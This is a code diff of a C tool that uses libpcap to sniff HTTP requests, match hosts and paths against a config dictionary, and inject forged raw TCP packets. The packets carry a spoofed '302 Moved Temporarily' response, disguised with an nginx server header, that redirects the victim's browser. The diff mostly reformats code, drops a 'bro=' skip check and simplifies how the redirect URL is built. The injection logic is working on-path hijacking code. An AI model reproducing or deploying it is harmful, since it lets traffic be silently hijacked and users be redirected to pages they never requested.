@@ -44,10 +44,10 @@
 
 #define PACKET_BUILD_LEN 1600
 
-/*
- * payload buffer length, limit to 512, so url in url.ini will
+/* 
+ * payload buffer length, limit to 512, so url in url.ini will 
  * be less than 512-50(the length of other in the 302 header)
- * length(url_302)<400 is a good choise
+ * length(url_302)<400 is a good choise 
  * */
 #define PAYLOAD_BUF_LEN 512
 
@@ -128,7 +128,7 @@ struct sniff_tcp {
 };
 
 
-char *get_relocation_url(hashtable_t *dict, http_header_t *header, char *url);
+char *get_relocation_url(hashtable_t *dict, http_header_t *header);
 
 //int find_platform(const char *agent, size_t len);
 int find_platform(char *agent, size_t len);
@@ -244,14 +244,14 @@ uint16_t tcp_chksum(uint16_t initcksum, uint8_t *tcphead, int tcplen, uint32_t *
 
 
 char *trim(char *str){
-    char *p = str;
-    char *p1;
-    if(p){
-        p1 = p + strlen(str) - 1;
-        while(*p && isspace(*p)) p++;
-        while(p1 > p && isspace(*p1)) *p1-- = '\0';
-    }
-    return p;
+        char *p = str;
+        char *p1;
+        if(p){
+            p1 = p + strlen(str) - 1;
+            while(*p && isspace(*p)) p++;
+            while(p1 > p && isspace(*p1)) *p1-- = '\0';
+        }
+        return p;
 }
 
 void read_config(hashtable_t *hash, char *config) {
@@ -288,7 +288,7 @@ void read_config(hashtable_t *hash, char *config) {
         fclose(file);
         slog_info(2, "load %s finished, total item: %d", config, count);
     } else {
-        slog_error(1, "file %s not exist!", config);
+       slog_error(1, "file %s not exist!", config);
     }
 }
 
@@ -322,18 +322,12 @@ int find_platform(char *agent, size_t len) {
     return 4;
 }
 
-char *get_relocation_url(hashtable_t *dict, http_header_t *header, char *url) {
+char *get_relocation_url(hashtable_t *dict, http_header_t *header) {
     elem_t *elem = NULL;
     elem = ht_get(dict, header->host);
 
     // domain not match, return
     if (elem == NULL) {
-        return NULL;
-    }
-
-    // if have "bro=", skip
-    if(strstr(header->path, "bro=") != NULL){
-        slog_info(2, "host: %s, path: %s , has bro, skip", header->host, header->path);
         return NULL;
     }
 
@@ -345,17 +339,14 @@ char *get_relocation_url(hashtable_t *dict, http_header_t *header, char *url) {
                 (elem->platform == 0 ||
                  elem->platform == header->platform ||
                  (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
-                sprintf(url, "%s&domain=%s&path=%s", elem->redirect, header->host, header->path);
-                return url;
-
+                return elem->redirect;
             }
         } else {
             if ((strcmp(header->path, elem->path) == 0) &&
                 (elem->platform == 0 ||
                  elem->platform == header->platform ||
                  (elem->platform == 3 && (header->platform == 1 || header->platform == 2)))) {
-                sprintf(url, "%s&domain=%s&path=%s", elem->redirect, header->host, header->path);
-                return url;
+                return elem->redirect;
             }
         }
         elem = elem->next;
@@ -546,20 +537,20 @@ int build_packet(u_char *packet, char *relocation_url) {
     //swap_bytes(ethernet->ether_dhost, ethernet->ether_shost, ETHER_ADDR_LEN);
     memcpy(ethernet->ether_dhost, g_gateway_mac, ETHER_ADDR_LEN);
     memcpy(ethernet->ether_shost, g_local_mac, ETHER_ADDR_LEN);
+    slog_debug(4, "%02x:%02x:%02x:%02x:%02x:%02x", 
+                                    g_local_mac[0],
+                                    g_local_mac[1],
+                                    g_local_mac[2],
+                                    g_local_mac[3],
+                                    g_local_mac[4],
+                                    g_local_mac[5]);
     slog_debug(4, "%02x:%02x:%02x:%02x:%02x:%02x",
-               g_local_mac[0],
-               g_local_mac[1],
-               g_local_mac[2],
-               g_local_mac[3],
-               g_local_mac[4],
-               g_local_mac[5]);
-    slog_debug(4, "%02x:%02x:%02x:%02x:%02x:%02x",
-               g_gateway_mac[0],
-               g_gateway_mac[1],
-               g_gateway_mac[2],
-               g_gateway_mac[3],
-               g_gateway_mac[4],
-               g_gateway_mac[5]);
+                                    g_gateway_mac[0],
+                                    g_gateway_mac[1],
+                                    g_gateway_mac[2],
+                                    g_gateway_mac[3],
+                                    g_gateway_mac[4],
+                                    g_gateway_mac[5]);
 
 
     // set ip (src, dst, checksum)
@@ -597,7 +588,7 @@ int build_packet(u_char *packet, char *relocation_url) {
 
     // set payload
     new_size_payload = sprintf(payload302,
-    //"HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
+                               //"HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n",
                                "HTTP/1.1 302 Moved Temporarily\r\nServer: nginx/1.0\r\nLocation: %s\r\nContent-Length: 0\r\nConnection: close\r\n\r\n\r\n\r\n",
                                relocation_url);
     new_size_payload--;
@@ -608,7 +599,7 @@ int build_packet(u_char *packet, char *relocation_url) {
 
     slog_debug(3, "payload302:%s", payload302);
     slog_debug(3, "size_payload:%d, size_eth: %d, size_ip: %d, size_tcp: %d, packet_len: %d",
-               new_size_payload, SIZE_ETHERNET, size_ip, size_tcp, packet_len);
+                 new_size_payload, SIZE_ETHERNET, size_ip, size_tcp, packet_len);
 
     ip->ip_sum = 0;
     sum = ip_chksum(0, (uint8_t *) ip, size_ip);
@@ -631,7 +622,6 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
     const struct sniff_tcp *tcp;            /* The TCP header */
     const char *payload;                    /* Packet payload */
     char *relocation_url;
-    char url_buf[URL_BUF_LEN];
     http_header_t req_http_header;
     int size_ip;
     int size_tcp;
@@ -714,7 +704,7 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 
         // get relocation url
         // 1, hash domain, 2, reg search path,  3, match platform
-        relocation_url = get_relocation_url(g_dict, &req_http_header, url_buf);
+        relocation_url = get_relocation_url(g_dict, &req_http_header);
         //slog_debug(4, "relocation_url:%s\n", relocation_url);
 
         if (relocation_url == NULL) {
@@ -832,14 +822,14 @@ int main(int argc, char **argv) {
     /* compile the filter expression */
     if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
         slog_error(1, "Couldn't parse filter %s: %s",
-                   filter_exp, pcap_geterr(handle));
+                filter_exp, pcap_geterr(handle));
         exit(EXIT_FAILURE);
     }
 
     /* apply the compiled filter */
     if (pcap_setfilter(handle, &fp) == -1) {
         slog_error(1, "Couldn't install filter %s: %s",
-                   filter_exp, pcap_geterr(handle));
+                filter_exp, pcap_geterr(handle));
         exit(EXIT_FAILURE);
     }
 
@@ -856,4 +846,6 @@ int main(int argc, char **argv) {
 
     return 0;
 }
+
+
 
